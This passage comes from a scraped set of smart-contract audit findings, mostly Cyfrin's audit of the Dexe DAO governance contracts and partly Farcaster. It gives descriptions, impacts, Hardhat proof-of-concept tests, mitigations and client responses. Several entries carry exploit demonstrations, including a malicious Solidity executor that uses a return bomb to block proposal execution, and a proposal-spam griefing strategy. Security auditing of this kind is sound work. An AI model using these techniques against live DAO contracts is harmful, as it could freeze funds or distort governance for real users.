    "code": [
        "      it(\"audit new distribution proposals funded by both eth & erc20 tokens results in stuck eth\", async () => {\n        // DistributionProposal eth balance starts at 0\n        let balanceBefore = toBN(await web3.eth.getBalance(dp.address));\n        assert.equal(balanceBefore, 0);\n\n        // mint reward tokens to sending address\n        await token.mint(govPool.address, wei(\"10\"));\n\n        // use GovPool to create a proposal with 10 wei reward\n        await govPool.createProposal(\n          \"example.com\",\n          [\n            [token.address, 0, getBytesApprove(dp.address, wei(\"10\"))],\n            [dp.address, 0, getBytesDistributionProposal(1, token.address, wei(\"10\"))],\n          ],\n          [],\n          { from: SECOND }\n        );\n\n        // fully fund the proposal using both erc20 token and eth at the same time\n        await impersonate(govPool.address);\n        await token.approve(dp.address, wei(\"10\"), { from: govPool.address });\n        await dp.execute(1, token.address, wei(\"10\"), { value: wei(10), from: govPool.address });\n\n        // only 1 vote so SECOND should get the entire 10 wei reward\n        await govPool.vote(1, true, 0, [1], { from: SECOND });\n\n        // claiming the reward releases the erc20 tokens but the eth remains stuck\n        await dp.claim(SECOND, [1]);\n\n        // DistributionProposal eth balance at 10 wei, reward eth is stuck\n        let balanceAfter = toBN(await web3.eth.getBalance(dp.address));\n        assert.equal(balanceAfter, wei(\"10\"));\n      });\n"
    ],
    "Description": [
        " DistributionProposal::execute() allows distribution proposals to be simultaneously funded by both eth & erc20 tokens in the same transaction."
    ],
    "Impact": [
        " When this occurs claiming rewards only releases the erc20 tokens - the eth is permanently stuck in the DistributionProposal contract."
    ],
    "Proof of Concept": [
        " Add the PoC to test/gov/proposals/DistributionProposal.test.js under the section describe(\"claim()\", () => {:",
        "Run with npx hardhat test --grep \"audit new distribution proposals funded by both eth & erc20 tokens results in stuck eth\""
    ],
    "Recommended Mitigation": [
        " DistributionProposal::execute() should revert if token != ETHEREUM_ADDRESS && msg.value > 0.",
        "Similar fixes will need to be made in places where the same issue appears:"
    ],
    "Dexe": [
        "",
        "Fixed in commits 5710f31 & 64bbcf5."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/lack-of-validations-on-critical-token-sale-parameters-can-allow-malicious-dao-pool-creators-to-dos-claims-by-token-sale-participants-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " When creating a tier, a DAO Pool creator can define custom token sale parameters. These parameters are verified in the TokenSaleProposalCreate::_validateTierInitParams. However, this function misses some crucial validations that can potentially deny token sale participants from claiming the DAO tokens they purchased."
    ],
    "Impact": [
        " All the above have a net effect of DOSing legitimate claims of token sale participants"
    ],
    "Recommended Mitigation": [
        " Consider having global variables that enforce reasonable limits for such parameters. Since DAO pool creators can be malicious, the protocol needs to introduce checks that protect the naive/first-time participants."
    ],
    "Dexe": [
        "\nFixed in commit 440b8b3 by adding validation of claimLockDuration <= cliffPeriod vesting period. Regarding the other suggestions we want to allow DAOs as much freedom as possible; if a DAO decides to create a token sale in 100 years, we don't want to limit them."
    ]
}
----End JSON----

https://solodit.xyz/issues/inconsistent-decimal-treatment-for-token-amounts-across-codebase-increases-security-risks-for-users-interacting-with-dexe-dao-contracts-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function createTier(\n        mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,\n        uint256 newTierId,\n        ITokenSaleProposal.TierInitParams memory _tierInitParams\n    ) external {\n        _validateTierInitParams(_tierInitParams);\n\n        uint256 saleTokenDecimals = _tierInitParams.saleTokenAddress.decimals();\n        uint256 totalTokenProvided = _tierInitParams.totalTokenProvided;\n\n  >      _tierInitParams.minAllocationPerUser = _tierInitParams.minAllocationPerUser.to18(\n            saleTokenDecimals\n        ); //@audit -> normalised to 18 decimals\n   >    _tierInitParams.maxAllocationPerUser = _tierInitParams.maxAllocationPerUser.to18(\n            saleTokenDecimals\n        ); //@audit -> normalised to 18 decimals\n   >     _tierInitParams.totalTokenProvided = totalTokenProvided.to18(saleTokenDecimals); //@audit -> normalised to 18 decimals\n\n        ....\n}\n",
        "  function getSaleTokenAmount(\n        ITokenSaleProposal.Tier storage tier,\n        address user,\n        uint256 tierId,\n        address tokenToBuyWith,\n        uint256 amount\n    ) public view returns (uint256) {\n        ITokenSaleProposal.TierInitParams memory tierInitParams = tier.tierInitParams;\n     require(amount > 0, \"TSP: zero amount\");\n        require(canParticipate(tier, tierId, user), \"TSP: cannot participate\");\n        require(\n            tierInitParams.saleStartTime <= block.timestamp &&\n                block.timestamp <= tierInitParams.saleEndTime,\n            \"TSP: cannot buy now\"\n        );\n\n        uint256 exchangeRate = tier.rates[tokenToBuyWith];\n>        uint256 saleTokenAmount = amount.ratio(exchangeRate, PRECISION); //@audit -> this saleTokenAmount is in  saleToken decimals -> unlike in the createTier function, this saleTokenAmount is not normalised to 18 decimals\n\n        require(saleTokenAmount != 0, \"TSP: incorrect token\");\n\n    >     require(\n            tierInitParams.maxAllocationPerUser == 0 ||\n                (tierInitParams.minAllocationPerUser <= saleTokenAmount &&\n                    saleTokenAmount <= tierInitParams.maxAllocationPerUser),\n            \"TSP: wrong allocation\"\n        ); //@audit checks sale token amount is in valid limits\n        require(\n            tier.tierInfo.totalSold + saleTokenAmount <= tierInitParams.totalTokenProvided,\n            \"TSP: insufficient sale token amount\"\n        ); //@audit checks total sold is less than total provided\n}\n"
    ],
    "Description": [
        " Inconsistencies have been identified within the codebase regarding the assumed decimal format for token amounts. Some sections of the codebase assume token amounts to be in their native token decimals, converting them to 18 decimals when needed, while other sections assume all token amounts to be in 18 decimals. This inconsistency poses potential issues",
        "User Confusion: Users may find it challenging to determine whether they should provide token amounts in their native token decimals or in 18 decimals, leading to confusion.",
        "Validation Errors: In certain scenarios, these inconsistencies could result in incorrect validations. For instance, comparing amounts in different decimal formats could lead to inaccurate results, creating a situation akin to comparing apples to oranges.",
        "Incorrect Transfers: There is also the risk of incorrect token transfers due to assumptions about the decimal format. Incorrectly normalised amounts might result in unintended token transfers.",
        "For eg. when initiating a new token sale proposal via TokenSaleProposalCreate::createTier, the function normalises tier parameters: minAllocationPerUser, maxAllocationPerUser, and totalTokenProvided from token decimals to 18 decimals.",
        "TokenSaleProposalCreate::createTier",
        "However, when a participant invokes TokenSalePropsal::buy, the sale token amount (derived from the purchase token's exchange rate) is assumed to be in 18 decimals. TokenSaleProposalBuy::getSaleTokenAmount function compares this amount with the tier minimum & maximum allocations per user.",
        "TokenSaleProposalBuy::getSaleTokenAmount",
        "Other instances where token amounts are assumed to be in token decimals are:"
    ],
    "Impact": [
        " Inconsistent token amount representation can trigger erroneous validations or wrong transfers."
    ],
    "Recommended Mitigation": [
        " When handling token amounts in your protocol, it's crucial to adopt a standardised approach for token decimals. Consider following one of below mentioned conventions while handling token decimals:",
        "Native Token Decimals: In this convention, each token amount is assumed to be represented in its native token's decimal format. For instance, 100 in USDC represents a token amount of 100 * 10^6, whereas 100 in DAI represents a token amount of 100 * 10^18. In this approach, the protocol takes on the responsibility of ensuring correct token decimal normalisations.",
        "Fixed 18 Decimals: Alternatively, you can assume that every token amount passed into any function is always in 18 decimals. However, it places the responsibility on the user to make the necessary token decimal normalisations.",
        "While both options are viable, we strongly recommend option 1. It aligns with industry standards, is intuitive, and minimises the potential for user errors. Given that Web3 attracts a diverse range of users, adopting option 1 allows the protocol to proactively handle the necessary conversions, enhancing user experience and reducing the chances of misunderstandings."
    ],
    "Dexe": [
        "\nFixed in commit 4a4c9d0."
    ],
    "Cyfrin": [
        " Verified. Dexe has chosen the \"Fixed 18 Decimal\" option where it assumes users send input token amounts in 18 decimals; this was already the default behavior in most of the code. Cyfrin continues to recommend the \"Native Decimal\" option where users call functions with input amounts in the token's native decimal and it is the protocol's responsibility to convert."
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-spam-create-identical-proposals-confusing-users-as-to-which-is-the-real-proposal-to-vote-on-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " If an attacker wants to interfere with the voting on a particular proposal, they can spam create many identical proposals to confuse users as to which is the \"real\" proposal they should vote on. Users will have to decide between which proposalId is the real one - why should users trust one unsigned integer over another?"
    ],
    "Impact": [
        " There are 2 possible implications of creating identical-looking fake proposals:",
        "Vote splitting: Users will have difficulty figuring out the real proposal from fake ones. As a result, voting may be erroneously distributed to fake proposals instead of being concentrated on the single real proposal. This griefing attack can be executed by anyone simply for the cost of gas and any tokens required to create the proposal being copied.",
        "Malicious actions: Creators can camouflage malicious proposal actions by creating similar-looking proposals that are all identical in all aspects except one single malicious proposal action. It is likely that users vote without necessary due diligence."
    ],
    "Proof of Concept": [
        " Consider one variant of this attack that can be 100% automated and highly effective and distributing votes from real to fake proposals. When a create proposal transaction appears in the mempool that the attacker wants to disrupt the attacker can do 1 of 3 strategies with equal probability:"
    ],
    "Recommended Mitigation": [
        " Consider implementing a 'lock-period' for proposal creators' tokens, adjustable by DAO pools. Alongside a higher minimum token requirement for proposal creation, this can deter duplicate proposals and enhance the DAO's security."
    ],
    "Dexe": [
        "\nWe already have several protection mechanisms implemented. In order for users to create proposals, they have to deposit a \u201cconfigurable\u201d amount of tokens into the DAO pool. Users also can't withdraw these tokens in the same block making it impossible to create proposals using flashloans. The proposal creation costs gas which also acts as DOS protection."
    ]
}
----End JSON----

https://solodit.xyz/issues/govpoolrevotedelegated-doesnt-support-multiple-tiers-of-delegation-resulting-in-delegated-votes-not-flowing-through-to-the-primary-voter-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "      describe(\"audit tiered revoteDelegate\", () => {\n          // using simple to verify amounts\n          let voteAmount     = wei(\"1000000000000000000\");\n          let totalVotes1Deg = wei(\"2000000000000000000\");\n          let totalVotes2Deg = wei(\"3000000000000000000\");\n          let proposal1Id    = 1;\n\n          let FIRST_DELEGATOR;\n          let SECOND_DELEGATOR;\n          let FINAL_VOTER;\n\n          beforeEach(async () => {\n            FIRST_DELEGATOR  = await accounts(10);\n            SECOND_DELEGATOR = await accounts(11);\n            FINAL_VOTER      = await accounts(12);\n\n            // mint tokens & deposit them to have voting power\n            await token.mint(FIRST_DELEGATOR, voteAmount);\n            await token.approve(userKeeper.address, voteAmount, { from: FIRST_DELEGATOR });\n            await govPool.deposit(FIRST_DELEGATOR, voteAmount, [], { from: FIRST_DELEGATOR });\n            await token.mint(SECOND_DELEGATOR, voteAmount);\n            await token.approve(userKeeper.address, voteAmount, { from: SECOND_DELEGATOR });\n            await govPool.deposit(SECOND_DELEGATOR, voteAmount, [], { from: SECOND_DELEGATOR });\n            await token.mint(FINAL_VOTER, voteAmount);\n            await token.approve(userKeeper.address, voteAmount, { from: FINAL_VOTER });\n            await govPool.deposit(FINAL_VOTER, voteAmount, [], { from: FINAL_VOTER });\n\n            // ensure that delegatedVotingAllowed == false so automatic re-voting\n            // will occur for delegation\n            let defaultSettings = POOL_PARAMETERS.settingsParams.proposalSettings[0];\n            assert.equal(defaultSettings.delegatedVotingAllowed, false);\n\n            // create 1 proposal\n            await govPool.createProposal(\"proposal1\", [[token.address, 0, getBytesApprove(SECOND, 1)]], []);\n\n            // verify delegatedVotingAllowed == false\n            let proposal1 = await getProposalByIndex(proposal1Id);\n            assert.equal(proposal1.core.settings[1], false);\n          });\n\n        it(\"audit testing 3 layer revote delegation\", async () => {\n\n          // FINAL_VOTER votes on proposal\n          await govPool.vote(proposal1Id, true, voteAmount, [], { from: FINAL_VOTER });\n\n          // verify FINAL_VOTER's voting prior to first delegation\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,\n            voteAmount\n          );\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,\n            \"0\" // nothing delegated to AUDITOR yet\n          );\n          assert.equal(\n            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),\n            voteAmount\n          );\n\n          // FIRST_DELEGATOR delegates to FINAL_VOTER, this should cancel FINAL_VOTER's original votes\n          // and re-vote for FINAL_VOTER which will include the delegated votes\n          await govPool.delegate(FINAL_VOTER, voteAmount, [], { from: FIRST_DELEGATOR });\n\n          // verify FINAL_VOTER's voting after first delegation\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,\n            voteAmount // personal votes remain the same\n          );\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,\n            voteAmount // delegated votes now included\n          );\n          assert.equal(\n            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),\n            totalVotes1Deg // delegated votes now included\n          );\n\n          // SECOND_DELEGATOR delegates to FIRST_DELEGATOR. These votes won't carry through into FINAL_VOTER\n          await govPool.delegate(FIRST_DELEGATOR, voteAmount, [], { from: SECOND_DELEGATOR });\n\n          // verify FINAL_VOTER's voting after second delegation\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,\n            voteAmount // personal votes remain the same\n          );\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,\n            voteAmount // delegated votes remain the same\n          );\n          assert.equal(\n            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),\n            totalVotes2Deg // fails here as delegated votes only being counted from the first delegation\n          );\n        });\n      });\n"
    ],
    "Description": [
        " When a proposal has delegatedVotingAllowed == false such that automatic delegation re-voting will occur in GovPoolVote::revoteDelegated(), delegated votes don't flow through multiple tiers of delegations down to the primary voter."
    ],
    "Impact": [
        " Delegated votes through multiple tiers of delegation don't get counted as they don't flow down to the primary voter.",
        "This issue is significant when analyzing voting behavior in established DAOs. In a presentation by KarmaHQ, it was noted that over 50% of delegates across protocols never participate in proposal voting. The current system's design, despite enabling multi-tier delegation, fails to accurately track and account for such delegated tokens."
    ],
    "Proof of Concept": [
        " Consider 1 proposal & 3 users: FINAL_VOTER, FIRST_DELEGATOR, SECOND_DELEGATOR where every user has 100 voting power.",
        "As a user I'd expect that if I delegated my votes to another user who had also delegated their votes, my delegated votes should also flow along with theirs to the final primary voter - otherwise my delegated votes are simply lost.",
        "Following PoC to be put in GovPool.test.js:",
        "Run with: npx hardhat test --grep \"audit testing 3 layer revote delegation\""
    ],
    "Recommended Mitigation": [
        " If delegatedVotingAllowed == false, GovPoolVote::revoteDelegated() should automatically flow delegated votes through multiple tiers of delegation down to the primary voter. If the project doesn't want to implement this, it should be made clear to users that their delegated votes will have no effect if the address they delegated to also delegates and doesn't vote - many users who come from countries that use Preferential voting systems will naturally expect their votes to flow through multiple layers of delegation."
    ],
    "Dexe": [
        "\nWe have chosen not to implement this by design; there are many voting systems out there, we prefer explicitness and transparency. Supporting multiple tiers of delegation would increase the system's complexity and introduce DOS attack vectors (for example if a chain of delegations is too large to fit into the block)."
    ]
}
----End JSON----

https://solodit.xyz/issues/users-can-use-delegated-treasury-voting-power-to-vote-on-proposals-that-give-them-more-delegated-treasury-voting-power-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " GovPoolCreate::_restrictInterestedUsersFromProposal() allows users to be restricted from voting on proposals that undelegate treasury voting power from a user, however no such restriction applies regarding voting on proposals that delegate treasury voting power to a user. This allows users who have received delegated treasury voting power to use that same power to vote on proposals that give them even more delegated treasury power."
    ],
    "Impact": [
        " Users can use delegated treasury voting power to vote for proposals that give them even more delegated treasury voting power - seems dangerous especially since these can be internal proposals."
    ],
    "Proof of Concept": [
        " N/A"
    ],
    "Recommended Mitigation": [
        " Option 1) GovPoolCreate::_restrictInterestedUsersFromProposal() should allow users to be restricted from voting on proposals that delegate treasury voting power.",
        "Option 2) It might be simpler to just hard-code this restriction in; if a user has delegated treasury voting power, then they can't vote on proposals that increase/decrease this power.",
        "The principle would be that users who receive delegated treasury voting power only keep this power at the pleasure of the DAO, and they can never use this power to vote on proposals that increase/decrease this power, for themselves or for other users.",
        "Right now it is dependent upon the user creating the proposals to restrict the correct users from voting which is error-prone, and only works for decreasing, not increasing, this power."
    ],
    "Dexe": [
        "\nFixed in PR168."
    ],
    "Cyfrin": [
        " Dexe has chosen to allow restricted users to vote on such proposals, just not with their delegated treasury. The delegated treasury of restricted users is subtracted from the required quorum calculation and restricted users can't vote with it on those proposals. This applies to delegating/undelegating treasury & burning expert nfts, such that users who have received delegated treasury power can't use it to delegate themselves more treasury power.",
        "However, Dexe has not fully implemented the recommendation that: \"they can never use this power to vote on proposals that increase/decrease this power, for themselves or for other users.\" A user with delegated treasury power can get around the new restrictions by creating a proposal to delegate treasury power to another address they control, then voting on that proposal with their existing address that has delegated treasury power.",
        "Cyfrin continues to recommend that users who have received delegated treasury voting power are not allowed to vote on any proposals that delegate/undelegate treasury voting power, both for themselves but also for other users."
    ]
}
----End JSON----

https://solodit.xyz/issues/changing-nftmultiplier-address-by-executing-a-proposal-that-calls-govpoolsetnftmultiplieraddress-can-deny-existing-users-from-claiming-pending-nft-multiplier-rewards-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " GovPool::setNftMultiplierAddress() which can be called by an internal proposal updates the nft multiplier address to a new contract.",
        "GovPoolRewards::_getMultipliedRewards() calls GovPool::getNftContracts() to retrieve the nft multiplier address when calculating rewards. If the contract has been updated to a different one any unclaimed nft multiplier rewards will no longer exist."
    ],
    "Impact": [
        " Users will lose their unclaimed nft multiplier rewards when a proposal gets required votes to execute GovPool::setNftMultiplierAddress()."
    ],
    "Proof of Concept": [
        " N/A"
    ],
    "Recommended Mitigation": [
        " The address of the current nft multiplier contract could be saved for each proposal when the proposal is created, such that updating the global nft multiplier address would only take effect for new proposals.",
        "If this is indeed the intended design, consider implementing user notifications to alert all users with unclaimed NFT multiplier rewards to collect them before the proposal voting period concludes. Furthermore, consider incorporating explicit disclaimers in the documentation to inform users that voting on a proposal aimed at updating multiplier rewards may result in the forfeiture of unclaimed rewards. This transparency will help users make informed decisions and mitigate potential unexpected outcomes."
    ],
    "Dexe": [
        "\nAcknowledged; this is expected behavior. If a DAO decides to add/remove the NFT multiplier, it should affect every DAO member regardless. This actually works in two ways: if a DAO decides to add an NFT multiplier, every unclaimed reward will be boosted."
    ]
}
----End JSON----

https://solodit.xyz/issues/proposal-creation-uses-incorrect-erc721powertotalpower-as-nft-power-not-updated-before-snapshot-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "      it(\"audit proposal creation uses incorrect ERC721Power totalPower as nft power not updated before snapshot\", async () => {\n        let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;\n\n        // required so we can call .toFixed() on BN returned outputs\n        ERC721Power.numberFormat = \"BigNumber\";\n\n        // ERC721Power::totalPower should be zero as no nfts yet created\n        assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n        // so proposal doesn't need to go to validators\n        await changeInternalSettings(false);\n\n        // set nftPower as the voting nft\n        // need to comment out check preventing updating existing\n        // nft address in GovUserKeeper::setERC721Address()\n        await impersonate(govPool.address);\n        await userKeeper.setERC721Address(nftPower.address, wei(\"33000\"), 33, { from: govPool.address });\n\n        // create a new VOTER account and mint them 5 power nfts\n        let VOTER = await accounts(10);\n        await nftPower.safeMint(VOTER, 1);\n        await nftPower.safeMint(VOTER, 2);\n        await nftPower.safeMint(VOTER, 3);\n        await nftPower.safeMint(VOTER, 4);\n        await nftPower.safeMint(VOTER, 5);\n\n        // advance to the approximate time when nft power calculation starts\n        await setTime(powerNftCalcStartTime);\n\n        // save existing nft power after power calculation has started\n        let nftTotalPowerBefore = \"4500000000000000000000000000\";\n        assert.equal((await nftPower.totalPower()).toFixed(), nftTotalPowerBefore);\n\n        // advance time; since none of the nfts have collateral deposited\n        // their power will decrement\n        await setTime((await getCurrentBlockTime()) + 10000);\n\n        // create a proposal which takes a snapshot of the current nft power\n        // but fails to update it before taking the snapshot, so uses the\n        // old incorrect power\n        let proposalId = 2;\n\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(3, wei(\"100\"), [], false)]]\n        );\n\n        // verify the proposal snapshot saved the nft totalPower before the time\n        // was massively advanced. This is incorrect as the true totalPower is 0\n        // by this time due to the nfts losing power. The proposal creation process\n        // fails to recalculate nft power before reading ERC721Power::totalPower\n        assert.equal((await userKeeper.nftSnapshot(2)).toFixed(), nftTotalPowerBefore);\n\n        // call ERC721::recalculateNftPower() for the nfts, this will update\n        // ERC721Power::totalPower with the actual current total power\n        await nftPower.recalculateNftPower(\"1\");\n        await nftPower.recalculateNftPower(\"2\");\n        await nftPower.recalculateNftPower(\"3\");\n        await nftPower.recalculateNftPower(\"4\");\n        await nftPower.recalculateNftPower(\"5\");\n\n        // verify that the true totalPower has decremented to zero as the nfts\n        // lost all their power since they didn't have collateral deposited\n        assert.equal((await nftPower.totalPower()).toFixed(), \"0\");\n\n        // the proposal was created with an over-inflated nft total power\n        // GovUserKeeper has a function called updateNftPowers() that is onlyOwner\n        // meaning it is supposed to be called by GovPool, but this function\n        // is never called anywhere. But in the GovUserKeeper unit tests it is\n        // called before the call to createNftPowerSnapshot() which creates\n        // the snapshot reading ERC721Power::totalPower\n      });\n"
    ],
    "Description": [
        " If GovPool is configured to use ERC721Power nft, when the proposal is created it doesn't recalculate the nft power, just reads ERC721Power::totalPower straight from storage.",
        "This is incorrect as it will be reading an old value; it has to recalculate nft power first then read it to read the correct, current value. There are tests in GovUserKeeper that do exactly this, before calling GovUserKeeper::createNftPowerSnapshot() the tests call GovUserKeeper::updateNftPowers(). But it looks like in the actual codebase there is never a call to GovUserKeeper::updateNftPowers(), only in the tests."
    ],
    "Impact": [
        " Proposals are created with an incorrect & potentially much greater ERC721Power::totalPower. This is used as the divisor in GovUserKeeper::getNftsPowerInTokensBySnapshot() hence a stale larger divisor will incorrectly reduce the voting power of nfts."
    ],
    "Proof of Concept": [
        " First comment out this check to allow the test to update the nft in-place.",
        "Then add the PoC to GovPool.test.js under section describe(\"getProposalState()\", () => {:",
        "Run with: npx hardhat test --grep \"audit proposal creation uses incorrect ERC721Power totalPower\""
    ],
    "Recommended Mitigation": [
        " As there could be many nfts calling GovUserKeeper::updateNftPowers() one-by-one is not an efficient way of doing this update. A solution may involve refactoring of how power nfts work."
    ],
    "Dexe": [
        "\nFixed in PR172, PR173. Removed snapshotting."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/a-misbehaving-validator-can-influence-voting-outcomes-even-after-their-voting-power-is-reduced-to-0-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " Validators are trusted parties appointed by DAO as a second-level check to prevent malicious proposals from getting executed.\nThe current system is designed with the following constraints:",
        "This design does not cover security risks associated with\na. loss of private keys\nb. inactive validator\nc. misbehaving validator",
        "While there is a provision to expel a validator by reducing his validator token balance to 0, the current system does not have a provision to prevent a validator from voting on active proposals with a back-dated snapshotId. If a validator is not aligned with the interests of the DAO and is expelled by voting, we believe it is a security risk to allow such validators to influence voting outcomes of active proposals"
    ],
    "Impact": [
        " A validator who no longer fulfils the trusted role of protecting DAO's best interests still holds control on DAO's future based on past voting power."
    ],
    "Proof of Concept": [
        " Consider the following scenario:",
        "This is a security risk for the DAO."
    ],
    "Recommended Mitigation": [
        " Consider adding isValidator check for vote and cancelVote functions in GovValidator. This would prevent a validator with zero current balance to influence voting outcomes based on their back-dated voting power."
    ],
    "Dexe": [
        "\nAcknowledged; we are using validator snapshotting so in past proposals they might have some voting power. We won\u2019t change this behavior since otherwise removing the validator should also remove their votes from the ongoing proposals (not ideal to do on-chain)."
    ]
}
----End JSON----

https://solodit.xyz/issues/voting-to-change-rewardsinfovoterewardscoefficient-has-an-unintended-side-effect-of-retrospectively-changing-voting-rewards-for-active-proposals-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "    function _getInitialVotingRewards(\n        IGovPool.ProposalCore storage core,\n        IGovPool.VoteInfo storage voteInfo\n    ) internal view returns (uint256) {\n        (uint256 coreVotes, uint256 coreRawVotes) = voteInfo.isVoteFor\n            ? (core.votesFor, core.rawVotesFor)\n            : (core.votesAgainst, core.rawVotesAgainst);\n\n        return\n            coreRawVotes.ratio(core.settings.rewardsInfo.voteRewardsCoefficient, PRECISION).ratio(\n                voteInfo.totalVoted,\n                coreVotes\n            ); //@audit -> initial rewards are calculated proportionate to the vote rewards coefficient\n    }\n"
    ],
    "Description": [
        " GovSettings::editSettings is one of the functions that can be executed via an internal proposal. When this function is called, setting are validated via GovSettings::_validateProposalSettings. This function does not check the value of RewardsInfo::voteRewardsCoefficient while updating the settings. There is neither a floor nor a cap for this setting.",
        "However, we've noted that this coefficient amplifies voting rewards as calculated in the GovPoolRewards::_getInitialVotingRewards shown below.",
        "This has the unintended side-effect that for the same proposal, different voters can get paid different rewards based on when the reward was claimed. In the extreme case where core.settings.rewardsInfo.voteRewardsCoefficient is voted to 0, note that we have a situation where voters who claimed rewards before the update got paid as promised whereas voters who claimed later got nothing."
    ],
    "Impact": [
        " Updating rewardsCoefficient can lead to unfair reward distribution on old proposals. Since voting rewards for a given proposal are communicated upfront, this could lead to a situation where promised rewards to users are not honoured."
    ],
    "Proof of Concept": [
        " N/A"
    ],
    "Recommended Mitigation": [
        " Consider freezing voteRewardMultiplier and the time of proposal creation. A prospective update of this setting via internal voting should not change rewards for old proposals."
    ],
    "Dexe": [
        "\nAcknowledged; similar issue to changing the nftMultiplier address. It is our design that if the DAO decides to change these parameters, this change is applied to all proposals including those in the past."
    ]
}
----End JSON----

https://solodit.xyz/issues/proposal-execution-can-be-dosed-with-return-bombs-when-calling-untrusted-execution-contracts-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "   function execute(\n        mapping(uint256 => IGovPool.Proposal) storage proposals,\n        uint256 proposalId\n    ) external {\n        .... // code\n\n        for (uint256 i; i < actionsLength; i++) {\n>            (bool status, bytes memory returnedData) = actions[i].executor.call{\n                value: actions[i].value\n            }(actions[i].data); //@audit returnedData could expand memory and cause out-of-gas exception\n\n            require(status, returnedData.getRevertMsg());\n        }\n   }\n",
        "contract MaliciousProposalActionExecutor is IProposalValidator{\n\n    function validate(IGovPool.ProposalAction[] calldata actions) external view override returns (bool valid){\n    \tvalid = true;\n    }\n\n    function vote(\n        uint256 proposalId,\n        bool isVoteFor,\n        uint256 voteAmount,\n        uint256[] calldata voteNftIds\n    ) external returns(bytes memory result){\n\n\tif(isVoteFor){\n\t\t// @audit implement actions for successful vote\n        \treturn \"\"; // 0 bytes\n        }\n\telse{\n\t\t// @audit implement actions for failed vote\n\n\t\t// Create a large bytes array\n                assembly{\n                     revert(0, 1_000_000)\n              }\n\t}\n\n   }\n}\n"
    ],
    "Description": [
        " GovPool::execute does not check for return bombs when executing a low-level call. A return bomb is a large bytes array that expands the memory so much that any attempt to execute the transaction will lead to an out-of-gas exception.",
        "This can create potentially risky outcomes for the DAO. One possible outcome is \"single sided\" execution, ie. \"actionsFor\" can be executed when voting is successful while \"actionsAgainst\" can be DOSed when voting fails.",
        "A clever proposal creator can design a proposal in such a way that only actionsFor can be executed and any attempts to execute actionsAgainst will be permanently DOS'ed (refer POC contract). T",
        "This is possible because the GovPoolExecute::execute does a low level call on potentially untrusted executor assigned to a specific action."
    ],
    "Impact": [
        " Voting actions can be manipulated by a creator causing two potential issues:"
    ],
    "Proof of Concept": [
        " Consider the following malicious proposal action executor contract. Note that when the proposal passes (isVotesFor = true), the vote() function returns empty bytes and when the proposal fails (isVotesFor = false), the same function returns a huge bytes array, effectively causing an \"out-of-gas\" exception to any caller."
    ],
    "Recommended Mitigation": [
        " Consider using ExcessivelySafeCall while calling untrusted contracts to avoid return bombs."
    ],
    "Dexe": [
        "\nAcknowledged; we are aware of the fact that proposals may be stuck in the \u201csucceeded\u201d state. But probably we won\u2019t alter this behavior on-chain since a DAO already decided to complete this proposal. Might add some labels on the front end.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/a-signer-cant-cancel-his-signature-before-a-deadline-cyfrin-none-cyfrin-farcaster-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " After signing a signature, a signer might want to cancel it for some reason. While checking other protocols, a signer can cancel by increasing his nonce.\nIn this protocol, we inherit from OpenZeppelin's Nonces contract and there are no ways to cancel the signature before a deadline."
    ],
    "Impact": [
        " Signers can't invalidate their signatures when they want."
    ],
    "Recommended Mitigation": [
        " Recommend adding a function like increaseNonce() to invalidate the past signatures."
    ],
    "Client": [
        "\nFixed by adding a base Nonces contract that exposes an external useNonce() function, enabling the caller to increment\ntheir nonce. Commit: 0189a1f"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/in-idregistry-a-recovery-address-might-be-updated-unexpectedly-cyfrin-none-cyfrin-farcaster-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Severity": [
        " Medium"
    ],
    "Description": [
        " There are 2 functions to update a recovery address, changeRecoveryAddress() and changeRecoveryAddressFor().\nAs changeRecoveryAddress() doesn't reset a pending signature that would be used in changeRecoveryAddressFor(), the below scenario would be possible.",
